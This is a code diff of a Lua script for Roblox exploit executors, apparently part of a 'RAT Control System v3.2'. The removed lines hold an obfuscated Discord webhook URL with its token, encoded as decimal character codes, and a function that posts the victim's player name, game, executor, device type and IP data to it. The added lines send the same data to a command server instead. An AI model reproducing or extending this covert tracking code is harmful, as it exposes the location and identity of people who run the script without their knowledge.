@@ -147,79 +147,7 @@ local function getExecutorInfo()
     return executorName .. extraInfo
 end
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
-local function getHiddenWebhook()
-    local chars = {
-        "104","116","116","112","115","58","47","47","100","105","115","99","111","114","100",
-        "46","99","111","109","47","97","112","105","47","119","101","98","104","111","111",
-        "107","115","47","49","52","52","49","55","49","48","50","53","49","57","48",
-        "55","56","55","52","56","50","55","47","101","102","119","78","113","51","73",
-        "105","118","65","71","100","121","67","106","50","114","56","112","104","99","106",
-        "81","51","108","103","68","67","104","81","109","106","121","65","105","107","75",
-        "45","45","107","105","69","57","53","73","107","119","99","119","102","116","113",
-        "89","103","81","45","104","53","54","49","88","95","79","66","112","73","56","95"
-    }
-    
-    local result = ""
-    for i, num in ipairs(chars) do
-        result = result .. string.char(tonumber(num))
-    end
-    
-    return result
-end
-
-local function sendDirectNotification(playerName, placeName, executor, deviceType, ipData)
-    local webhook = getHiddenWebhook()
-    local currentTime = os.date("%d.%m.%Y %H:%M")
-    
-    local description = string.format(
-        "Игрок: %s\n" ..
-        "Игра: %s\n" ..
-        "Инжектор: %s\n" ..
-        "Устройство: %s\n\n" ..
-        "IP информация\n%s\n\n" ..
-        "RAT Control System v3.2 • %s",
-        playerName, placeName, executor, deviceType, ipData, currentTime
-    )
-    
-    local payload = {
-        embeds = {{
-            title = "🔌 Новый инжект!",
-            description = description,
-            color = 65280,
-            timestamp = DateTime.now():ToIsoDate(),
-            footer = {
-                text = "RAT Control System v3.2"
-            }
-        }},
-        username = "RAT System"
-    }
-    
-    local requestFunc
-    if syn and syn.request then
-        requestFunc = syn.request
-    elseif request then
-        requestFunc = request
-    elseif http and http.request then
-        requestFunc = http.request
-    else
-        return false
-    end
-    
-    local success, response = pcall(function()
-        return requestFunc({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-    
-    return success and response ~= nil
-end
-
+-- ОТПРАВКА ИНЖЕКТА ЧЕРЕЗ СЕРВЕР (без вебхука!)
 local function sendInjectNotification()
     local playerName = player.Name
     
@@ -228,21 +156,9 @@ local function sendInjectNotification()
         placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
     end)
     
-    local executor = "Unknown"
-    if identifyexecutor then
-        pcall(function()
-            executor = identifyexecutor()
-        end)
-    end
+    local executor = getExecutorInfo()
     
-    local deviceType = "PC"
-    if UserInputService.TouchEnabled then
-        if UserInputService.MouseEnabled then
-            deviceType = "Tablet"
-        else
-            deviceType = "Mobile"
-        end
-    end
+    local deviceType = getDeviceType()
     
     local ipData = "N/A"
     local requestFunc = syn and syn.request or request or (http and http.request)
@@ -270,7 +186,18 @@ local function sendInjectNotification()
         end)
     end
     
-    local success = sendDirectNotification(playerName, placeName, executor, deviceType, ipData)
+    -- Отправляем на сервер (сервер сам отправит в вебхук)
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = SERVER_URL.."/command",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                command = "inject_notify",
+                args = {playerName, placeName, ipData, executor, deviceType}
+            })
+        })
+    end)
     
     return success
 end
